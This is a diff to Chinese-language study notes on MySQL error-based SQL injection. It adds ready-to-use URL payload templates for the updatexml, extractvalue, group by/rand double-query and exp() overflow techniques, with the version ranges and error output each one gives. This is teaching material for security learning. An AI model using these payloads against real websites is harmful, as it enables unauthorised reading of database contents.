@@ -27,18 +27,42 @@
 　　使用联合查询 **union select 1，2，……（根据列数来）**
 
 　　‍
+# **报错注入**：
+1. updatexml () 注入（实战首选）
+- 原理：XML 解析错误，XPath 表达式内容随错误返回
+- 适用版本：MySQL 5.1.5+
+- 标准模板：
+```sql
+?id=1' and updatexml(1,concat(0x7e,(查询语句),0x7e),1)--+
+```
+结果格式：XPATH syntax error: '~数据~'
+优缺点：语法最简单、100% 稳定；最多返回 32 字符
 
-　　**报错注入：**
+2. extractvalue () 注入
+原理：同 updatexml ()，XML 节点提取错误
+适用版本：MySQL 5.1.5+
+标准模板：
+sql
+?id=1' and extractvalue(1,concat(0x7e,(查询语句),0x7e))--+
+结果格式：同 updatexml ()
+优缺点：语法更简洁；同样 32 字符限制
 
-1. extractvalue:   
-    extractvalue函数用于从XML文档中提取特定的值。它接受两个参数，第一个参数是要提取值的XML文档，第二个参数是XPath表达式，用于指定要提取的值的位置。该函数将返回符合XPath表达式的节点的值。
-2. updatexml:  
-    updatexml函数用于更新XML文档中特定节点的值。它接受三个参数，第一个参数是要更新的XML文档，第二个参数是XPath表达式，用于指定要更新的节点的位置，第三个参数是新的节点值。该函数将返回更新后的XML文档。
-3. floor:  
-    floor函数用于向下取整，将一个数值向下取整为最接近的整数。它接受一个参数，即要进行取整操作的数值，返回最接近的小于或等于该数值的整数。例如，floor(3.8)将返回3，floor(4.2)将返回4。
+3. 双查询注入（group by+rand ()）
+原理：分组主键冲突，随机数两次计算结果不同
+适用版本：所有 MySQL 版本
+标准模板（必用 rand (0) 保证稳定）：
+```sql
+?id=-1' union select 1,count(*),concat((查询语句),floor(rand(0)*2)) as x from information_schema.tables group by x--+
+```
+结果格式：Duplicate entry '数据0' for key 'group_key'
+优缺点：无长度限制、兼容老版本；语法复杂
 
-　　注：这里如说**使用updatexml来查询表中数据时，会出现查询数据不完整的问题**，
-
-　　解决方案：
-
-　　可以**使用limit来限制查询个数，来一个一个查询，也可以使用group_concat时使用substr进行字符串截取 其中"1，32"控制截取的起始与结束位置：**
+4. exp () 注入
+原理：指数函数数值溢出错误
+适用版本：MySQL 5.5.5+
+标准模板：
+```sql
+?id=1' and exp(~(select * from (查询语句)a))--+
+```
+结果格式：DOUBLE value is out of range in 'exp(数据)'
+优缺点：无长度限制；适用版本稍高
